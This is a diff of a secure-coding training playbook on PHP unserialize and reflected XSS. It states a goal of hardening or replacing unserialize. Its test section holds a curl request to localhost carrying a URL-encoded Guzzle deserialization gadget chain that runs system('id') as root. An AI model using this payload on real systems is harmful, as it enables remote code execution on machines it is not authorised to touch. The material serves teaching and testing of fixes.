@@ -2,13 +2,11 @@
 
 Welcome to this fifth playbook, here you'll learn about basic reflected Cross Site Scripting (XSS) issues and deserialization.
 
-
 ## Unserialize
 
 Goal: Get rid of the dangerous unserialize function by using a safer alternative, or harden the unserialize call to prevent RCE.
 
 Deserialization is a recurring issue for various languages and frameworks. As complex data needs to be parsed and used to reconstruct an object, it has been known to introduce critical security issues (remote code execution, file write, ssrf, ...) on languages such as php, java, ruby, and formats like json, xml, yaml, etc.
-
 
 ```bash
 # Test feature
@@ -18,7 +16,6 @@ curl -sSkgi 'http://127.0.0.1/intake.php?data=O%3A7%3A%22LogLine%22%3A1%3A%7Bs%3
 curl -sSkgi 'http://127.0.0.1/intake.php?data=a%3A2%3A%7Bi%3A7%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A2%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00methods%22%3Ba%3A1%3A%7Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A23%3A%22GuzzleHttp%5CHandlerStack%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CHandlerStack%00handler%22%3Bs%3A2%3A%22id%22%3Bs%3A30%3A%22%00GuzzleHttp%5CHandlerStack%00stack%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A31%3A%22%00GuzzleHttp%5CHandlerStack%00cached%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Ds%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A5%3Bi%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D'
 # Should output: "uid=0(root) gid=0(root) groups=0(root)"
 ```
-
 
 ## Reflected XSS
 
